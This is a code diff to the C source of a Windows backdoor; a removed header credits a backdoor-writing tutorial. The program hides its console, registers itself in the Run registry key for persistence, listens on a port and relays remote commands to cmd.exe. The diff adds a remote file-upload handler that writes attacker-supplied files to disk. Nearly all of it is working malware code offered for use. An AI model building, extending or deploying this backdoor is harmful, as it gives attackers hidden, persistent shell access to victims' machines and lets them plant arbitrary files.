@@ -1,27 +1,14 @@
-﻿/******************************************************************
-*   Source code from the "Writing a basic backdoor in C" tutorial *
-*                                                                 *
-*   NOT Written for educational purposes only!!                   *
-*                                                                 *
-*   Tested with Dev-C++ 4.9.9.2, should work with other compilers *
-*   as well.                                                      *
-*                                                                 *                  *
-******************************************************************/
-
-/*
-Don't forget to link winsock32.lib otherwise your compiler won't understand the sockets
-*/
-#include <stdio.h>
+﻿#include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
 #include <string.h>
 #include <winsock.h>
 #include <iostream>
+#include <sys/stat.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
 //our variables, we need them globally to use them in all functions
-const char welcome[] = "Welcome, enter your password please : ";
 char bufferin[1024]; //the buffer to read data from socket
 char bufferout[65535]; //the buffer to write data to the socket
 int i, port; // i is used for loop , port is going to keep the portnumber
@@ -42,7 +29,6 @@ int main() //the main function
 {
     // Add the program to startup
     AddToStartup();
-
     //hide console
     FreeConsole();
     //set listen port
@@ -61,7 +47,7 @@ int main() //the main function
     if (bind(locsock, (SOCKADDR*)&sinloc, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
     {
         WSACleanup();
-        printf("Error binding socket.");
+        printf("Error binding socket.\n");
         return EXIT_FAILURE;
     }
 
@@ -69,7 +55,7 @@ int main() //the main function
     if (listen(locsock, 5) == SOCKET_ERROR)
     {
         WSACleanup();
-        printf("Error listening socket.");
+        printf("Error listening socket.\n");
         return EXIT_FAILURE;
     }
 
@@ -123,7 +109,11 @@ void CommandPrompt(void) //the function which handles the complete commandprompt
     wchar_t cmd[] = L"cmd.exe"; //the command we want to start
 
     //start cmd prompt
-    CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &procinfo);
+    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &procinfo)) {
+        printf("CreateProcess failed (%d).\n", GetLastError());
+        return;
+    }
+
     //endless loop
     while (1)
     {
@@ -158,6 +148,12 @@ void CommandPrompt(void) //the function which handles the complete commandprompt
         ZeroMemory(bufferin, sizeof(bufferin));
         //receive the command given
         recv(remsock, bufferin, sizeof(bufferin), 0);
+
+        if (strncmp(bufferin, "upload", 6) == 0) {
+            handle_upload(remsock);
+            continue;
+        }
+
         //if command is 'exit' or 'EXIT' then we have to capture it to prevent our program
         //from hanging.
         if ((strcmp(bufferin, exit1) == 0) || (strcmp(bufferin, exit2) == 0))
@@ -168,20 +164,35 @@ void CommandPrompt(void) //the function which handles the complete commandprompt
         }
         //else write the command to cmd.exe
         WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
-        //clear the bufferin
-        for (i = 0; i < sizeof(bufferin); i++)
-        {
-            bufferin[i] = 0;
-        }
+        // clear bufferin
+        ZeroMemory(bufferin, sizeof(bufferin));
     }
     //close up all handles
 closeup:
-    CloseHandle(procinfo.hThread);
-    CloseHandle(procinfo.hProcess);
-    CloseHandle(newstdin);
-    CloseHandle(writein);
-    CloseHandle(readout);
-    CloseHandle(newstdout);
+    if (procinfo.hThread != NULL) {
+        CloseHandle(procinfo.hThread);
+        procinfo.hThread = NULL;
+    }
+    if (procinfo.hProcess != NULL) {
+        CloseHandle(procinfo.hProcess);
+        procinfo.hProcess = NULL;
+    }
+    if (newstdin != NULL) {
+        CloseHandle(newstdin);
+        newstdin = NULL;
+    }
+    if (writein != NULL) {
+        CloseHandle(writein);
+        writein = NULL;
+    }
+    if (readout != NULL) {
+        CloseHandle(readout);
+        readout = NULL;
+    }
+    if (newstdout != NULL) {
+        CloseHandle(newstdout);
+        newstdout = NULL;
+    }
 }
 
 wchar_t reg[] = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
@@ -220,4 +231,43 @@ void AddToStartup(void)
         RegSetValueEx(hKey, reg2, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1);
         RegCloseKey(hKey);
     }*/
+}
+
+void handle_upload(SOCKET sock) {
+    char filename[256];
+    int received;
+    FILE* fp;
+
+    // Clear the buffer and receive the filename
+    ZeroMemory(bufferin, sizeof(bufferin));
+    if (recv(sock, filename, sizeof(filename), 0) <= 0) {
+        send(sock, "Error receiving filename\n", strlen("Error receiving filename\n"), 0);
+        return;
+    }
+
+    // Remove newline character if present
+    char* newline = strchr(filename, '\n');
+    if (newline) {
+        *newline = '\0';
+    }
+    send(sock, "File created\n", strlen("File created\n"), 0);
+
+    // Open the file for writing
+    fp = fopen(filename, "w");
+    if (fp == NULL) {
+        send(sock, "Error opening file for writing\n", strlen("Error opening file for writing\n"), 0);
+        return;
+    }
+
+    // Receive the file content
+    char stop[] = "stop upload";
+    while ((received = recv(sock, bufferin, sizeof(bufferin), 0)) > 0) {
+        if (strstr(bufferin, "stop upload") != NULL) {
+            break;
+        }
+        fwrite(bufferin, 1, received, fp);
+    }
+    fclose(fp);
+
+    send(sock, "File received successfully\n", strlen("File received successfully\n"), 0);
 }
